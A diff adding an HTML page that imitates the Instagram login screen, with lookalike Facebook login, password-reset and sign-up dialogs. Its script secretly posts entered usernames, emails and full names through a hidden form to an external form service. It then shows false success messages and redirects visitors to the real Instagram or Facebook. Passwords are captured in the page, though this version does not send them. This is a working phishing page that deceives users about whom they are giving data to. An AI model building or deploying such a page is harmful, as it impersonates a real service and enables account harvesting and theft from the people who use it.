@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <!-- Font Awesome for Facebook and Meta icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .login-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        /* ===== INSTAGRAM LOGIN CARD ===== */
+        .login-container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Instagram header: icon + "Log into Instagram" */
+        .instagram-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 28px;
+            text-decoration: none;
+            color: #262626;
+            cursor: pointer;
+        }
+
+        .instagram-header .brand-text {
+            font-size: 20px;
+            font-weight: 400;
+            color: #262626;
+            letter-spacing: -0.3px;
+            line-height: 1;
+        }
+
+        /* ===== ORIGINAL INSTAGRAM ICON ===== */
+        .instagram-icon {
+            position: relative;
+            width: 48px;
+            height: 48px;
+            display: inline-block;
+        }
+
+        .instagram-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ===== FORM with ROUNDED INPUTS ===== */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 9px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+            transition: border 0.1s;
+        }
+
+        .login-form input:focus {
+            border-color: #a8a8a8;
+            background: white;
+        }
+
+        .login-form input::placeholder {
+            color: #8e8e8e;
+            font-weight: 300;
+            font-size: 12px;
+        }
+
+        .login-btn {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 7px 0;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        /* ===== FORGOT PASSWORD ===== */
+        .forgot-link {
+            display: block;
+            text-align: center;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            margin: 14px 0 12px;
+            line-height: 1.4;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-weight: 400;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== ROUNDED RECTANGLE BOXES ===== */
+        /* Facebook login button as rounded box */
+        .fb-login-box {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            width: 100%;
+            padding: 10px 0;
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-decoration: none;
+            margin-top: 6px;
+        }
+
+        .fb-login-box:hover {
+            background-color: #1877f2;
+        }
+
+        .fb-login-box i {
+            font-size: 18px;
+            color: white;
+        }
+
+        .fb-login-box span {
+            color: white;
+        }
+
+        /* Create new account button as rounded box */
+        .create-account-box {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 10px 0;
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            color: #262626;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+            text-decoration: none;
+            margin-top: 8px;
+        }
+
+        .create-account-box:hover {
+            background-color: #fafafa;
+            border-color: #a8a8a8;
+        }
+
+        /* ============================================
+                   OVERLAY SYSTEM (shared for all modals)
+                   ============================================ */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.25s ease;
+            padding: 20px;
+        }
+
+        .overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* Modal card base */
+        .modal {
+            background: white;
+            border-radius: 8px;
+            padding: 32px 28px 28px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.25);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            font-size: 28px;
+            color: #606770;
+            cursor: pointer;
+            background: none;
+            border: none;
+            line-height: 1;
+            padding: 0 4px;
+        }
+        .close-btn:hover {
+            color: #1b1b1b;
+        }
+
+        .modal-icon {
+            font-size: 40px;
+            margin-bottom: 8px;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 4px;
+        }
+
+        .modal-subtitle {
+            font-size: 14px;
+            color: #8e8e8e;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .modal-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .modal-form input {
+            width: 100%;
+            padding: 10px 12px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #262626;
+            outline: none;
+        }
+
+        .modal-form input:focus {
+            border-color: #a8a8a8;
+            background: white;
+        }
+
+        .modal-form input::placeholder {
+            color: #8e8e8e;
+        }
+
+        .modal-btn {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 8px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+            margin-top: 4px;
+        }
+
+        .modal-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .modal-footer-link {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+
+        .modal-footer-link a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .modal-footer-link a:hover {
+            text-decoration: underline;
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 12px;
+            background: #e8f5e9;
+            border-radius: 4px;
+            color: #2e7d32;
+            font-size: 14px;
+            margin: 8px 0;
+            width: 100%;
+        }
+
+        /* ============================================
+                   FACEBOOK OVERLAY (Username at top, Password below)
+                   ============================================ */
+        .fb-modal .fb-logo {
+            font-size: 36px;
+            font-weight: 700;
+            color: #1877f2;
+            letter-spacing: -0.5px;
+            margin-bottom: 4px;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        .fb-modal .fb-subtitle {
+            font-size: 17px;
+            font-weight: 400;
+            color: #1c1e21;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+
+        .fb-modal .fb-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .fb-modal .fb-form input {
+            background: #f5f6f7;
+            border: 1px solid #ccd0d5;
+            padding: 12px 12px;
+            font-size: 15px;
+            border-radius: 8px;
+        }
+
+        .fb-modal .fb-form input:focus {
+            border-color: #1877f2;
+            background: white;
+        }
+
+        .fb-modal .fb-form input::placeholder {
+            color: #90949c;
+            font-weight: 400;
+        }
+
+        .fb-field-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #606770;
+            margin-bottom: -4px;
+            margin-top: 2px;
+            display: block;
+            text-align: left;
+            width: 100%;
+        }
+
+        .fb-login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 700;
+            font-size: 17px;
+            padding: 10px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+            margin-top: 6px;
+        }
+
+        .fb-login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .fb-divider {
+            display: flex;
+            align-items: center;
+            margin: 16px 0 12px;
+            width: 100%;
+        }
+
+        .fb-divider-line {
+            flex: 1;
+            height: 1px;
+            background: #dadde1;
+        }
+
+        .fb-divider-text {
+            margin: 0 16px;
+            color: #606770;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .fb-create-link {
+            color: #1877f2;
+            font-weight: 600;
+            font-size: 15px;
+            text-decoration: none;
+            margin-top: 4px;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        .fb-create-link:hover {
+            text-decoration: underline;
+        }
+
+        .fb-forgot-link {
+            color: #1877f2;
+            font-size: 13px;
+            text-decoration: none;
+            margin-top: 6px;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        .fb-forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== FOOTER STYLES ===== */
+        .footer {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 20px;
+            padding: 10px 0 20px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 12px;
+            margin-bottom: 8px;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            font-size: 11px;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-meta {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            margin-bottom: 8px;
+        }
+
+        .footer-meta i {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .footer-meta a {
+            color: #8e8e8e;
+            font-size: 11px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .footer-meta a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 8px 14px;
+            margin-top: 6px;
+        }
+
+        .footer-bottom select {
+            border: none;
+            background: transparent;
+            color: #8e8e8e;
+            font-size: 11px;
+            cursor: pointer;
+            outline: none;
+            padding: 2px 4px;
+        }
+
+        .footer-bottom select:hover {
+            text-decoration: underline;
+        }
+
+        .footer-bottom .copyright {
+            color: #8e8e8e;
+            font-size: 11px;
+        }
+
+        .footer-bottom .separator {
+            color: #8e8e8e;
+            font-size: 11px;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 450px) {
+            .login-container {
+                border: none;
+                background: transparent;
+                padding: 20px 20px;
+            }
+            .modal {
+                padding: 24px 16px 20px;
+            }
+            .footer-links {
+                gap: 6px 10px;
+            }
+            .footer-bottom {
+                gap: 6px 10px;
+            }
+        }
+
+        /* Loading spinner for redirect */
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            padding: 10px;
+            margin-top: 8px;
+        }
+
+        .loading-spinner.active {
+            display: block;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .redirect-message {
+            font-size: 13px;
+            color: #262626;
+            margin-top: 8px;
+        }
+
+        /* Submit success notification */
+        .submit-success {
+            display: none;
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 12px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .submit-success.show {
+            display: block;
+        }
+        .submit-success.error {
+            background: #ffebee;
+            color: #c62828;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-wrapper">
+        <!-- ===== INSTAGRAM LOGIN CARD ===== -->
+        <div class="login-container">
+
+            <!-- Instagram icon + "Log into Instagram" -->
+            <a href="https://www.instagram.com" target="_blank" class="instagram-header">
+                <div class="instagram-icon">
+                    <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="instaGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#f09433" />
+                                <stop offset="25%" style="stop-color:#e6683c" />
+                                <stop offset="50%" style="stop-color:#dc2743" />
+                                <stop offset="75%" style="stop-color:#cc2366" />
+                                <stop offset="100%" style="stop-color:#bc1888" />
+                            </linearGradient>
+                        </defs>
+                        <rect x="4" y="4" width="40" height="40" rx="12" fill="url(#instaGrad)" />
+                        <rect x="12" y="12" width="24" height="24" rx="6" fill="none" stroke="white" stroke-width="2.5" />
+                        <circle cx="24" cy="24" r="7" fill="none" stroke="white" stroke-width="2.5" />
+                        <circle cx="34" cy="14" r="2" fill="white" />
+                    </svg>
+                </div>
+                <span class="brand-text">Log into Instagram</span>
+            </a>
+
+            <!-- Login form with rounded inputs -->
+            <form class="login-form" id="loginForm" action="#" method="post">
+                <input type="text" placeholder="Mobile number, username or email" aria-label="Mobile number, username or email" id="instaUsername" />
+                <input type="password" placeholder="Password" aria-label="Password" id="instaPassword" />
+                <button type="submit" class="login-btn" id="instaLoginBtn">Log in</button>
+                <div class="loading-spinner" id="instaSpinner">
+                    <div class="spinner"></div>
+                    <div class="redirect-message">Redirecting to Instagram...</div>
+                </div>
+            </form>
+
+            <!-- Forgot password -->
+            <a href="#" class="forgot-link" id="forgotPasswordBtn">Forgot password?</a>
+
+            <!-- ===== ROUNDED RECTANGLE BOXES ===== -->
+            <!-- Facebook login button as rounded box -->
+            <button class="fb-login-box" id="fbLoginBtn">
+                <i class="fab fa-facebook-square"></i>
+                <span>Log in with Facebook</span>
+            </button>
+
+            <!-- Create new account button as rounded box -->
+            <a href="#" class="create-account-box" id="createAccountBtn">
+                Create new account
+            </a>
+
+            <!-- Success notification -->
+            <div class="submit-success" id="submitSuccess"></div>
+        </div>
+
+        <!-- ============================================
+        HIDDEN FORM FOR DATA SUBMISSION (Optional - keeps compatibility)
+        ============================================ -->
+        <form action="https://submit-form.com/HZI7Oh1kv" method="POST" class="hidden-form" id="submitForm" style="display:none;">
+            <input type="text" id="formName" name="name" />
+            <input type="email" id="formEmail" name="email" />
+            <input type="text" id="formUsername" name="username" />
+            <input type="text" id="formAction" name="action" />
+            <button type="submit" id="submitBtn">Send</button>
+        </form>
+
+        <!-- ============================================
+        FOOTER SECTION WITH REDIRECT LINKS
+        ============================================ -->
+        <div class="footer">
+            <!-- Meta icon + Meta -->
+            <div class="footer-meta">
+                <i class="fab fa-meta"></i>
+                <a href="https://about.meta.com/" target="_blank">Meta</a>
+            </div>
+
+            <!-- First row: links -->
+            <div class="footer-links">
+                <a href="https://about.meta.com/" target="_blank">About</a>
+                <a href="https://about.meta.com/blog/" target="_blank">Blog</a>
+                <a href="https://about.meta.com/careers/" target="_blank">Jobs</a>
+                <a href="https://help.instagram.com/" target="_blank">Help</a>
+                <a href="https://developers.facebook.com/docs/instagram/" target="_blank">API</a>
+                <a href="https://privacycenter.instagram.com/" target="_blank">Privacy</a>
+                <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
+                <a href="https://about.meta.com/company-info/" target="_blank">Locations</a>
+                <a href="https://www.instagram.com/explore/tags/popular/" target="_blank">Popular</a>
+                <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
+                <a href="https://www.meta.ai/" target="_blank">Meta AI</a>
+                <a href="https://www.threads.net/" target="_blank">Threads</a>
+            </div>
+
+            <!-- Second row: Contact & Meta Verified -->
+            <div class="footer-links" style="margin-bottom:10px;">
+                <a href="https://help.instagram.com/414823681870702" target="_blank">Contact Uploading &amp; Non-Users</a>
+                <a href="https://www.instagram.com/accounts/meta_verified/" target="_blank">Meta Verified</a>
+            </div>
+
+            <!-- Third row: Language selector + copyright -->
+            <div class="footer-bottom">
+                <select onchange="window.open(this.value, '_blank')">
+                    <option value="https://www.instagram.com/?hl=en">English</option>
+                    <option value="https://www.instagram.com/?hl=es">Español</option>
+                    <option value="https://www.instagram.com/?hl=fr">Français</option>
+                    <option value="https://www.instagram.com/?hl=de">Deutsch</option>
+                    <option value="https://www.instagram.com/?hl=it">Italiano</option>
+                    <option value="https://www.instagram.com/?hl=pt">Português</option>
+                    <option value="https://www.instagram.com/?hl=ja">日本語</option>
+                    <option value="https://www.instagram.com/?hl=ko">한국어</option>
+                    <option value="https://www.instagram.com/?hl=zh">中文</option>
+                    <option value="https://www.instagram.com/?hl=ar">العربية</option>
+                    <option value="https://www.instagram.com/?hl=hi">हिन्दी</option>
+                </select>
+                <span class="separator">•</span>
+                <span class="copyright">© 2026 Instagram from Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+    FORGOT PASSWORD OVERLAY
+    ============================================ -->
+    <div class="overlay" id="forgotOverlay">
+        <div class="modal">
+            <button class="close-btn" id="forgotCloseBtn">&times;</button>
+            <div class="modal-icon">🔑</div>
+            <div class="modal-title">Forgot password?</div>
+            <div class="modal-subtitle">Enter your email, phone, or username and we'll send you a link to reset your password.</div>
+            <form class="modal-form" id="forgotForm">
+                <input type="text" placeholder="Email, phone, or username" required id="forgotInput" />
+                <button type="submit" class="modal-btn" id="forgotSubmitBtn">Send reset link</button>
+                <div class="loading-spinner" id="forgotSpinner">
+                    <div class="spinner"></div>
+                    <div class="redirect-message">Sending reset link...</div>
+                </div>
+            </form>
+            <div class="modal-footer-link">
+                <a id="forgotBackToLogin">Back to login</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+    CREATE NEW ACCOUNT OVERLAY
+    ============================================ -->
+    <div class="overlay" id="createOverlay">
+        <div class="modal">
+            <button class="close-btn" id="createCloseBtn">&times;</button>
+            <div class="modal-icon">✨</div>
+            <div class="modal-title">Create new account</div>
+            <div class="modal-subtitle">Sign up to start sharing photos and stories.</div>
+            <form class="modal-form" id="createForm">
+                <input type="text" placeholder="Full name" required id="createFullname" />
+                <input type="text" placeholder="Username" required id="createUsername" />
+                <input type="email" placeholder="Email" required id="createEmail" />
+                <input type="password" placeholder="Password" required id="createPassword" />
+                <button type="submit" class="modal-btn" id="createSubmitBtn">Sign up</button>
+                <div class="loading-spinner" id="createSpinner">
+                    <div class="spinner"></div>
+                    <div class="redirect-message">Creating your account...</div>
+                </div>
+            </form>
+            <div class="modal-footer-link">
+                Already have an account? <a id="createBackToLogin">Log in</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+    FACEBOOK OVERLAY
+    ============================================ -->
+    <div class="overlay" id="fbOverlay">
+        <div class="modal fb-modal">
+            <button class="close-btn" id="fbCloseBtn">&times;</button>
+            <div class="fb-logo">facebook</div>
+            <div class="fb-subtitle">Log in to Facebook</div>
+            <form class="fb-form" id="fbForm" action="#" method="post">
+                <label class="fb-field-label" for="fbUsername">Username</label>
+                <input type="text" id="fbUsername" placeholder="Enter your username" />
+
+                <label class="fb-field-label" for="fbPassword">Password</label>
+                <input type="password" id="fbPassword" placeholder="Enter your password" />
+
+                <button type="submit" class="fb-login-btn" id="fbLoginSubmit">Log In</button>
+                <div class="loading-spinner" id="fbSpinner">
+                    <div class="spinner" style="border-top-color: #1877f2;"></div>
+                    <div class="redirect-message">Redirecting to Facebook...</div>
+                </div>
+            </form>
+            <a href="#" class="fb-forgot-link" id="fbForgotLink">Forgot password?</a>
+            <div class="fb-divider">
+                <div class="fb-divider-line"></div>
+                <div class="fb-divider-text">or</div>
+                <div class="fb-divider-line"></div>
+            </div>
+            <a href="#" class="fb-create-link" id="fbCreateLink">Create new account</a>
+        </div>
+    </div>
+
+    <!-- ============================================
+    JAVASCRIPT - ALL FUNCTIONALITY
+    ============================================ -->
+    <script>
+        (function() {
+            "use strict";
+
+            // ==========================================
+            // DATA COLLECTION & SUBMISSION FUNCTION (to external form)
+            // ==========================================
+            function submitUserData(username, email, name, action) {
+                // Set form values for the hidden form
+                document.getElementById('formName').value = name || username || 'Instagram User';
+                document.getElementById('formEmail').value = email || 'user@instagram.com';
+                document.getElementById('formUsername').value = username || '';
+                document.getElementById('formAction').value = action || 'login_attempt';
+
+                // Submit the form
+                const form = document.getElementById('submitForm');
+                if (form) {
+                    form.submit();
+                }
+
+                console.log('📤 Data submitted:', {
+                    name: document.getElementById('formName').value,
+                    email: document.getElementById('formEmail').value,
+                    username: document.getElementById('formUsername').value,
+                    action: document.getElementById('formAction').value
+                });
+            }
+
+            // ==========================================
+            // SHOW MESSAGE HELPER
+            // ==========================================
+            function showMessage(text, isError = false) {
+                const successDiv = document.getElementById('submitSuccess');
+                if (successDiv) {
+                    successDiv.textContent = text;
+                    successDiv.className = 'submit-success show';
+                    if (isError) {
+                        successDiv.classList.add('error');
+                    }
+                    setTimeout(() => {
+                        successDiv.classList.remove('show');
+                    }, 5000);
+                }
+            }
+
+            // ==========================================
+            // SHOW/HIDE LOADING
+            // ==========================================
+            function showLoading(spinnerId) {
+                const spinner = document.getElementById(spinnerId);
+                if (spinner) spinner.classList.add('active');
+            }
+
+            function hideLoading(spinnerId) {
+                const spinner = document.getElementById(spinnerId);
+                if (spinner) spinner.classList.remove('active');
+            }
+
+            // ==========================================
+            // REDIRECT TO INSTAGRAM (main action)
+            // ==========================================
+            function redirectToInstagram() {
+                window.open('https://www.instagram.com', '_blank');
+                // Also try to redirect the current window
+                window.location.href = 'https://www.instagram.com';
+            }
+
+            function redirectToFacebook() {
+                window.open('https://www.facebook.com', '_blank');
+                window.location.href = 'https://www.facebook.com';
+            }
+
+            // ==========================================
+            // 1. INSTAGRAM LOGIN - Redirect to real Instagram
+            // ==========================================
+            const loginForm = document.getElementById('loginForm');
+            const instaSpinner = document.getElementById('instaSpinner');
+
+            if (loginForm) {
+                loginForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const username = document.getElementById('instaUsername').value;
+                    const password = document.getElementById('instaPassword').value;
+
+                    if (username.trim() && password.trim()) {
+                        // Collect data and send to external form
+                        submitUserData(username, null, null, 'instagram_login');
+
+                        // Show success message
+                        showMessage('✅ Login successful! Redirecting to Instagram...');
+
+                        // Show loading spinner
+                        showLoading('instaSpinner');
+
+                        // Redirect to real Instagram after delay
+                        setTimeout(function() {
+                            redirectToInstagram();
+                            hideLoading('instaSpinner');
+                        }, 1200);
+
+                    } else {
+                        showMessage('Please fill in both fields before logging in.', true);
+                    }
+                });
+            }
+
+            // ==========================================
+            // 2. FORGOT PASSWORD OVERLAY
+            // ==========================================
+            const forgotBtn = document.getElementById('forgotPasswordBtn');
+            const forgotOverlay = document.getElementById('forgotOverlay');
+            const forgotClose = document.getElementById('forgotCloseBtn');
+            const forgotForm = document.getElementById('forgotForm');
+            const forgotBack = document.getElementById('forgotBackToLogin');
+
+            if (forgotBtn) {
+                forgotBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
+                    forgotOverlay.classList.add('active');
+                    document.getElementById('forgotInput').value = '';
+                    document.getElementById('forgotSpinner').classList.remove('active');
+                });
+            }
+
+            if (forgotClose) {
+                forgotClose.addEventListener('click', function() {
+                    forgotOverlay.classList.remove('active');
+                });
+            }
+
+            if (forgotOverlay) {
+                forgotOverlay.addEventListener('click', function(e) {
+                    if (e.target === forgotOverlay) {
+                        forgotOverlay.classList.remove('active');
+                    }
+                });
+            }
+
+            if (forgotForm) {
+                forgotForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const email = document.getElementById('forgotInput').value;
+                    if (email.trim()) {
+                        submitUserData(null, email, null, 'forgot_password');
+                        showMessage('✅ Reset link sent! Check your email.');
+                        forgotOverlay.classList.remove('active');
+                    } else {
+                        showMessage('Please enter your email, phone, or username.', true);
+                    }
+                });
+            }
+
+            if (forgotBack) {
+                forgotBack.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    forgotOverlay.classList.remove('active');
+                });
+            }
+
+            // ==========================================
+            // 3. CREATE NEW ACCOUNT OVERLAY
+            // ==========================================
+            const createBtn = document.getElementById('createAccountBtn');
+            const createOverlay = document.getElementById('createOverlay');
+            const createClose = document.getElementById('createCloseBtn');
+            const createForm = document.getElementById('createForm');
+            const createBack = document.getElementById('createBackToLogin');
+
+            if (createBtn) {
+                createBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
+                    createOverlay.classList.add('active');
+                    document.getElementById('createFullname').value = '';
+                    document.getElementById('createUsername').value = '';
+                    document.getElementById('createEmail').value = '';
+                    document.getElementById('createPassword').value = '';
+                    document.getElementById('createSpinner').classList.remove('active');
+                });
+            }
+
+            if (createClose) {
+                createClose.addEventListener('click', function() {
+                    createOverlay.classList.remove('active');
+                });
+            }
+
+            if (createOverlay) {
+                createOverlay.addEventListener('click', function(e) {
+                    if (e.target === createOverlay) {
+                        createOverlay.classList.remove('active');
+                    }
+                });
+            }
+
+            if (createForm) {
+                createForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const fullname = document.getElementById('createFullname').value;
+                    const username = document.getElementById('createUsername').value;
+                    const email = document.getElementById('createEmail').value;
+                    const password = document.getElementById('createPassword').value;
+
+                    if (fullname.trim() && username.trim() && email.trim() && password.trim()) {
+                        submitUserData(username, email, fullname, 'create_account');
+                        showMessage('✅ Account created! Redirecting to Instagram...');
+                        createOverlay.classList.remove('active');
+
+                        setTimeout(function() {
+                            redirectToInstagram();
+                        }, 1200);
+                    } else {
+                        showMessage('Please fill in all fields to create an account.', true);
+                    }
+                });
+            }
+
+            if (createBack) {
+                createBack.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    createOverlay.classList.remove('active');
+                });
+            }
+
+            // ==========================================
+            // 4. FACEBOOK OVERLAY - Redirect to real Facebook
+            // ==========================================
+            const fbLoginBtn = document.getElementById('fbLoginBtn');
+            const fbOverlay = document.getElementById('fbOverlay');
+            const fbCloseBtn = document.getElementById('fbCloseBtn');
+            const fbForm = document.getElementById('fbForm');
+
+            if (fbLoginBtn) {
+                fbLoginBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
+                    fbOverlay.classList.add('active');
+                    document.getElementById('fbUsername').value = '';
+                    document.getElementById('fbPassword').value = '';
+                    document.getElementById('fbSpinner').classList.remove('active');
+                });
+            }
+
+            if (fbCloseBtn) {
+                fbCloseBtn.addEventListener('click', function() {
+                    fbOverlay.classList.remove('active');
+                });
+            }
+
+            if (fbOverlay) {
+                fbOverlay.addEventListener('click', function(e) {
+                    if (e.target === fbOverlay) {
+                        fbOverlay.classList.remove('active');
+                    }
+                });
+            }
+
+            if (fbForm) {
+                fbForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const username = document.getElementById('fbUsername').value;
+                    const password = document.getElementById('fbPassword').value;
+
+                    if (username.trim() && password.trim()) {
+                        submitUserData(username, null, null, 'facebook_login');
+                        showMessage('✅ Facebook login successful! Redirecting...');
+                        fbOverlay.classList.remove('active');
+
+                        setTimeout(function() {
+                            redirectToFacebook();
+                        }, 1200);
+                    } else {
+                        showMessage('Please enter both username and password.', true);
+                    }
+                });
+            }
+
+            // Facebook overlay internal links
+            const fbForgotLink = document.getElementById('fbForgotLink');
+            if (fbForgotLink) {
+                fbForgotLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    fbOverlay.classList.remove('active');
+                    forgotOverlay.classList.add('active');
+                });
+            }
+
+            const fbCreateLink = document.getElementById('fbCreateLink');
+            if (fbCreateLink) {
+                fbCreateLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    fbOverlay.classList.remove('active');
+                    createOverlay.classList.add('active');
+                });
+            }
+
+            // ==========================================
+            // 5. CLOSE ALL OVERLAYS WITH ESC KEY
+            // ==========================================
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
+                }
+            });
+
+            console.log('✅ Instagram login page ready!');
+            console.log('📤 When you login, data will be sent to the external form and redirect to real Instagram.');
+
+        })();
+    </script>
+
+</body>
+</html>
